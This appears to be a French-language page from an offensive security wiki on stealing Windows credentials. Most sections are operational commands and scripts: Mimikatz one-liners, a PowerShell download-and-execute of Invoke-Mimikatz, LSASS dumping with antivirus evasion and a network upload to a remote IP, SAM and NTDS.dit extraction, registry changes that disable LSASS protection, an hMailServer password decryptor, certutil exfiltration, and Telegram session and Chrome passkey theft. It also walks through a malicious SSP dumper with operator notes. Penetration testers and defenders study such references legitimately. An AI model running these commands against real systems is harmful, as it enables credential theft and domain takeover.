# Vol d’identifiants Windows

{{#include ../../banners/hacktricks-training.md}}

## Identifiants Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Découvrez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d’extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j’ai créé pour **rechercher des mots de passe et des hashes** sur la machine victime.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Contournement de l’AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, Defender ne le détecte pas.\
Vous pouvez utiliser cet outil pour **effectuer un dump du processus lsass**, **télécharger le dump** et **extraire** les **identifiants localement** à partir du dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque** : Certains **AV** peuvent **détecter** comme **malveillante** l’utilisation de **procdump.exe pour dumper lsass.exe**, car ils **détectent** les chaînes **"procdump.exe" et "lsass.exe"**. Il est donc **plus furtif de passer** le **PID** de lsass.exe comme **argument** à procdump, **au lieu du nom lsass.exe.**

### Dumper lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll**, située dans `C:\Windows\System32`, est chargée de **dumper la mémoire d’un processus** en cas de plantage. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être appelée avec `rundll32.exe`.\
Les deux premiers arguments n’ont pas d’importance, mais le troisième est divisé en trois éléments. Le premier correspond au PID du processus à dumper, le deuxième indique l’emplacement du fichier dump et le troisième doit impérativement être le mot **full**. Il n’existe aucune autre option.\
Après avoir analysé ces trois éléments, la DLL crée le fichier dump et y transfère la mémoire du processus spécifié.\
Il est possible d’utiliser **comsvcs.dll** pour dumper le processus lsass, ce qui évite d’avoir à téléverser et à exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

La commande suivante est utilisée pour l’exécution :

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump de lsass avec le Gestionnaire des tâches**

1. Faites un clic droit sur la barre des tâches, puis cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus « Local Security Authority Process » dans l’onglet Processus
4. Faites un clic droit sur le processus « Local Security Authority Process », puis cliquez sur « Créer un fichier de vidage »

### Dump de lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Un vidage mémoire complet du système déjà existant, ou une copie compressée dans un dossier utilisateur accessible, peut conserver des informations d’identification exploitables pour une analyse hors ligne. Les noms de fichiers tels que `MEMORY.DMP` et `MEMORY.7z` ne sont que des pistes à examiner : vérifiez leur provenance et les droits d’accès, et ne supposez pas qu’ils contiennent des identifiants utilisables ou à jour.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping LSASS avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dump de processus protégés qui permet d’obfusquer le dump mémoire et de le transférer vers des postes de travail distants sans l’écrire sur le disque.

**Fonctionnalités clés** :

1. Contourner la protection PPL
2. Obfusquer les fichiers de dump mémoire pour échapper aux mécanismes de détection par signature de Defender
3. Téléverser le dump mémoire via les méthodes d’upload RAW et SMB sans l’écrire sur le disque (dump fileless)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – extraction de LSASS basée sur SSP sans MiniDumpWriteDump

Ink Dragon utilise un dumper en trois étapes appelé **LalsDumper**, qui n’appelle jamais `MiniDumpWriteDump` : les hooks EDR placés sur cette API ne se déclenchent donc jamais :<sup>[[3]](#references)</sup>

1. **Loader de l’étape 1 (`lals.exe`)** – recherche dans `fdp.dll` un espace réservé constitué de 32 caractères `d` minuscules, le remplace par le chemin absolu de `rtu.txt`, enregistre la DLL modifiée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau fournisseur de support de sécurité (SSP).
2. **Étape 2 dans LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, applique un XOR à chaque octet avec `0x20`, puis mappe le blob décodé en mémoire avant de transférer l’exécution.
3. **Étape 3 : dumper** – la charge utile mappée réimplémente la logique de MiniDump à l’aide de **syscalls directs**, résolus à partir de noms d’API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump compressé de LSASS dans le fichier, puis ferme le handle afin que l’exfiltration puisse avoir lieu ultérieurement.

Notes pour l’opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. L’étape 1 remplace l’espace réservé codé en dur par le chemin absolu de `rtu.txt` ; les séparer brise donc la chaîne.
* L’enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez ajouter vous-même cette valeur pour que LSASS recharge le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis fournissez-les à Mimikatz/Volatility pour en extraire les identifiants.
* L’exécution de `lals.exe` nécessite des droits d’administrateur/SeTcb pour que `AddSecurityPackageA` réussisse ; une fois l’appel terminé, LSASS charge de façon transparente le SSP malveillant et exécute l’étape 2.
* Supprimer la DLL du disque ne la décharge pas de LSASS. Supprimez l’entrée du registre et redémarrez LSASS (en redémarrant la machine), ou laissez-la en place pour une persistance à long terme.

## CrackMapExec

### Extraire les hachages SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump des secrets LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump de NTDS.dit depuis le DC cible

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump l’historique des mots de passe NTDS.dit depuis le DC cible

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Afficher l’attribut pwdLastSet pour chaque compte NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Vol de SAM & SYSTEM

Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique**, car ils sont protégés.

### Depuis le registre

Le plus simple pour voler ces fichiers est d’en obtenir une copie depuis le registre :

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** à l’aide de :

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Copie de cliché instantané de volume

Vous pouvez copier des fichiers protégés à l'aide de ce service. Vous devez être administrateur.

#### Avec vssadmin

Le binaire vssadmin est uniquement disponible dans les versions Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **copie du fichier SAM** (le lecteur utilisé est « C: » et le fichier est enregistré dans C:\users\Public), mais vous pouvez utiliser cette méthode pour copier n’importe quel fichier protégé :

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour copier SAM, SYSTEM et ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Identifiants Active Directory - NTDS.dit**

Le fichier **NTDS.dit** est considéré comme le cœur d'**Active Directory** : il contient des données cruciales sur les objets utilisateur, les groupes et leurs appartenances. C'est là que sont stockés les **hashes de mot de passe** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)**, située dans **_%SystemRoom%/NTDS/ntds.dit_**.

Cette base de données contient trois tables principales :

- **Data Table** : cette table stocke des informations sur les objets, comme les utilisateurs et les groupes.
- **Link Table** : elle suit les relations, telles que les appartenances aux groupes.
- **SD Table** : les **descripteurs de sécurité** de chaque objet y sont stockés, afin d'assurer la sécurité et le contrôle d'accès des objets enregistrés.

Les recherches de Christoffer Andersson sur la couche base de données documentent plus en détail ces tables et leur comportement selon les versions.<sup>[[8]](#references)</sup>

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier, et celui-ci est utilisé par _lsass.exe_. Ainsi, une **partie** du fichier **NTDS.dit** peut se trouver **dans la mémoire de `lsass`** (les données les plus récemment consultées s'y trouvent probablement grâce à un **cache** qui améliore les performances).

#### Déchiffrer les hashes dans NTDS.dit

Le hash est chiffré trois fois :

1. Déchiffrer la clé de chiffrement des mots de passe (**PEK**) à l'aide du **BOOTKEY** et de **RC4**.
2. Déchiffrer le **hash** à l'aide de **PEK** et de **RC4**.
3. Déchiffrer le **hash** à l'aide de **DES**.

La **PEK** a la **même valeur sur chaque contrôleur de domaine**, mais elle est **chiffrée** dans **NTDS.dit** à l'aide du **BOOTKEY** propre au contrôleur de domaine, provenant de sa ruche **SYSTEM**. Par conséquent, l'extraction des identifiants nécessite à la fois **NTDS.dit** et **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Une [technique de redirection de la table des handles du kernel](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) distincte permet de copier un objet fichier NTDS déjà ouvert sans VSS, mais nécessite une primitive arbitraire de lecture/écriture du kernel sur le contrôleur de domaine.<sup>[[16]](#references)</sup>

### Copier NTDS.dit à l'aide de Ntdsutil

Disponible depuis Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Vous pouvez également utiliser l’astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N’oubliez pas que vous aurez également besoin d’une copie du **fichier SYSTEM** (là encore, utilisez l’astuce consistant à [**le récupérer depuis le registre ou à utiliser volume shadow copy**](#stealing-sam-and-system)).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Vous pouvez également les **extraire automatiquement** à l’aide d’un compte d’administrateur de domaine valide :

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Pour les **fichiers NTDS.dit volumineux**, il est recommandé de les extraire avec [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Cela permet d’extraire non seulement les secrets, mais aussi l’ensemble des objets et de leurs attributs afin d’obtenir davantage d’informations, une fois le fichier brut NTDS.dit récupéré.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

La ruche `SYSTEM` est facultative, mais permet le déchiffrement des secrets (hashes NT et LM, identifiants supplémentaires tels que des mots de passe en clair, clés Kerberos ou de trust, historiques de mots de passe NT et LM). Entre autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatages de dernière connexion et de changement de mot de passe, descriptions des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence des unités organisationnelles et appartenances, domaines approuvés avec le type, la direction et les attributs des trusts...

## Lazagne

Téléchargez le binaire [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire les identifiants de plusieurs logiciels.

```
lazagne.exe all
```

## Autres outils pour extraire des identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil permet d’extraire des identifiants de la mémoire. Téléchargez-le ici : [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire des identifiants du fichier SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extraire les identifiants du fichier SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Téléchargez-le depuis [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), puis **exécutez-le** : les mots de passe seront extraits.

## Extraction des sessions RDP inactives et affaiblissement des contrôles de sécurité

Le RAT FinalDraft d’Ink Dragon inclut un tasker `DumpRDPHistory`, dont les techniques sont utiles à tout red-teamer :<sup>[[3]](#references)</sup>

### Collecte de télémétrie de type DumpRDPHistory

* **Cibles RDP sortantes** – analysez chaque ruche utilisateur à `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint` et l’horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Indices de connexions RDP entrantes** – interrogez le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour rechercher les ID d’événement **21** (ouverture de session réussie) et **25** (déconnexion), afin d’identifier les personnes qui ont administré la machine :

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. Le fallback CredSSP + NTLM laisse son vérificateur et ses tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou mettre en place une persistance sur les contrôleurs de domaine.

### Downgrades du registre ciblés par FinalDraft

Le même implant altère également plusieurs clés de registre pour faciliter le vol d’identifiants :<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` désactive Restricted Admin pour les connexions RDP entrantes ; cela n’active **pas** le pass-the-hash via ce mode. Définir la valeur sur `0` autorise Restricted Admin sur la destination, mais le client doit demander `/RestrictedAdmin` ou utiliser une stratégie qui impose Restricted Admin.<sup>[[14]](#references)</sup> Un hash seul ne confère pas de droits d’administrateur à distance ; voir [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des jetons UAC, afin que les administrateurs locaux obtiennent des jetons sans restriction sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l’administrateur DSRM de se connecter lorsque le DC est en ligne, offrant aux attaquants un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l’accès à la mémoire trivial pour des outils de dump comme LalsDumper.

## Identifiants de configuration hMailServer (après compromission)

Vérifiez les fichiers de configuration exacts `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` et `C:\ProgramData\hMailServer\hMailServer.ini`, selon la disposition de l’installation. Une valeur `[Security] AdministratorPassword=` lisible et non vide est un hash de mot de passe d’administration hMailServer ; elle ne prouve pas qu’il s’agit du mot de passe d’un administrateur Windows. Si cet identifiant est récupéré, tout pivot vers un compte Windows nécessite de vérifier indépendamment la réutilisation du mot de passe et les droits de connexion.

Pour les installations utilisant une base de données SQL CE, la valeur distincte `[Database] Password=` dans le fichier INI protège la base de données. Dans les anciennes installations, cette valeur est chiffrée avec Blowfish à l’aide de la clé statique `THIS_KEY_IS_NOT_SECRET` et d’inversions de l’endianness des mots de 4 octets. Utilisez la chaîne hexadécimale du fichier INI avec cet extrait Python :<sup>[[2]](#references)</sup>

Vérifiez d’abord que le compte actuel peut lire **à la fois** le fichier INI et le fichier de base de données SQL CE `.sdf` correspondant. Le mot de passe du fichier INI protège la base de données ; il est distinct des hashes des comptes de messagerie qui y sont stockés. Inspectez ou mettez à niveau une **copie** d’une base de données en service, jamais le fichier actif.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrous de fichier, chargez le fournisseur 32 bits et effectuez une mise à niveau si nécessaire avant d’interroger les hashes :

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

La colonne `accountpassword` utilise le format de hash hMailServer (mode hashcat `1421`). Un mot de passe de boîte aux lettres cracké ne permet de pivoter vers un utilisateur Windows que si ce mot de passe est réutilisé par un compte local/de domaine et que ce compte dispose des droits de connexion à distance requis.

## Interception du callback de connexion LSA (LsaApLogonUserEx2)

Certains outils capturent les mots de passe de connexion **en plaintext** en interceptant le callback de connexion LSA `LsaApLogonUserEx2`. L’idée consiste à hooker ou à envelopper le callback du package d’authentification afin de capturer les identifiants **pendant la connexion** (avant le hachage), puis de les écrire sur le disque ou de les renvoyer à l’opérateur. Cette méthode est généralement implémentée sous la forme d’un helper qui s’injecte dans LSA ou s’y enregistre, puis consigne chaque événement de connexion interactive/réseau réussi avec le nom d’utilisateur, le domaine et le mot de passe.<sup>[[1]](#references)</sup>

Notes opérationnelles :
- Nécessite des privilèges d’administrateur local/SYSTEM pour charger le helper dans le chemin d’authentification.
- Les identifiants capturés n’apparaissent que lorsqu’une connexion a lieu (interactive, RDP, service ou réseau, selon le hook).

## Identifiants de connexion enregistrés dans SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) stocke les informations de connexion enregistrées dans un fichier `sqlstudio.bin` propre à chaque utilisateur. Des outils d’extraction dédiés peuvent analyser le fichier et récupérer les identifiants SQL enregistrés. Dans les shells qui ne renvoient que la sortie des commandes, le fichier est souvent exfiltré en l’encodant en Base64 et en l’affichant sur stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Du côté de l’opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Vol de session de navigateur et de cookies via Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Vol de session `tdata` de Telegram Desktop

Telegram Desktop conserve les données d’autorisation et l’état du compte dans son répertoire **`tdata`**. Une session copiée peut être chargée par un outil compatible pour s’authentifier sans le mot de passe du compte, tant que cette autorisation reste valide ; si le chiffrement des données locales est activé, le stealer a également besoin du code d’accès. Une session authentifiée peut alors révéler des données d’identité, les métadonnées des conversations et des appartenances, des messages et des médias téléchargeables.<sup>[[10]](#references)</sup>

### Recherche et récupération

Recherchez à la fois les installations classiques et portables ; les noms des packages du Microsoft Store varient. Énumérez donc les répertoires de packages contenant `TelegramMessenge` et inspectez leur sous-arborescence `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Si les lectures ordinaires échouent et que le jeton du processus **contient déjà et active** `SeBackupPrivilege`, l’accès tenant compte du mode sauvegarde offre une solution de repli ; il n’obtient pas le privilège et n’élève pas les droits du processus. `CreateFileW` avec `FILE_FLAG_BACKUP_SEMANTICS` peut demander la sémantique de sauvegarde/restauration et contourner les contrôles de sécurité des fichiers lorsque les privilèges requis sont présents dans le jeton, mais le flag à lui seul ne permet pas de contourner un verrou de partage incompatible.<sup>[[10]](#references)[[11]](#references)</sup>

Pour les fichiers verrouillés en cours d’utilisation, créez/lisez une **Volume Shadow Copy** ; pour les fichiers bloqués par des ACL, `robocopy /B` utilise le mode sauvegarde et contourne les ACL des fichiers et des répertoires.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Un implant soucieux de la bande passante peut d’abord envoyer uniquement l’inventaire des chemins de fichiers, recevoir un identifiant d’instantané ainsi que les chemins déjà stockés par le C2, puis téléverser uniquement les fichiers manquants. Ainsi, même de petits transferts incrémentiels après l’énumération récursive de `tdata` peuvent indiquer un vol de session réussi.<sup>[[10]](#references)</sup>

### Détection et confinement

Corrélez l’accès récursif à `tdata` par un processus autre que Telegram avec l’activation de `SeBackupPrivilege`, l’ouverture de fichiers avec la sémantique de sauvegarde, l’activité VSS ou un processus enfant `robocopy.exe` utilisant `/B`. Recherchez également l’énumération rapide de `%APPDATA%` et `%LOCALAPPDATA%\Packages`, suivie de connexions sortantes depuis le même processus. Après une compromission, utilisez **Paramètres → Appareils** (ou **Confidentialité et sécurité → Sessions actives**) pour mettre fin aux sessions non reconnues ; activer la validation en deux étapes ne révoque pas une autorisation déjà volée.<sup>[[10]](#references)[[13]](#references)</sup>

## Vol de passkeys / identifiants WebAuthn depuis Chrome sur Windows

Si une exécution de code est obtenue en tant qu’**utilisateur victime** sur un hôte Windows utilisant **Chrome + les passkeys synchronisées de Google Password Manager**, les passkeys deviennent une cible intéressante en post-exploitation, même **sans droits admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefacts locaux intéressants

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** stocke des enregistrements **`WebauthnCredentialSpecifics`** encodés en protobuf. Un processus exécuté sous le même compte utilisateur peut énumérer le **RP ID**, le **nom d’utilisateur**, l’**ID d’identifiant** et les données de clé privée chiffrées des passkeys synchronisées.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stocke l’état local d’inscription de l’appareil, notamment **`wrapped_identity_private_key`** et le secret encapsulé utilisé pour récupérer les identifiants synchronisés.<sup>[[4]](#references)</sup>

Triage rapide :

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Les blobs de clés liés au TPM peuvent tout de même servir d’oracle de signature local

Si le navigateur exporte une clé d’identité adossée au TPM sous forme de **`NCRYPT_OPAQUE_KEY_BLOB`** et stocke ce blob dans un état accessible à l’utilisateur, un malware n’a **pas** besoin d’extraire la clé privée brute. Il peut simplement réimporter le blob sur la **même machine** et demander au TPM local de signer des données contrôlées par l’attaquant :<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

This means que **la liaison matérielle empêche l’exportation hors de l’appareil, mais pas l’utilisation par le même utilisateur sur le terminal compromis**.

### Voies d’exploitation pratiques

1. **Pass-ta-key / relais d’identité de l’appareil**<sup>[[4]](#references)</sup>
   - Énumérer les `WebauthnCredentialSpecifics` dans le LevelDB de Chrome.
   - Démarrer une connexion par passkey et obtenir un nouveau défi WebAuthn.
   - Utiliser le blob `wrapped_identity_private_key` volé sur le TPM de la victime pour signer la liaison de la requête cloud-authenticator.
   - Relayer l’assertion renvoyée au relying party.
   - C’est particulièrement intéressant lorsque le RP accepte `userVerification=preferred` ou ne rejette pas les assertions avec **`UV=0`**.
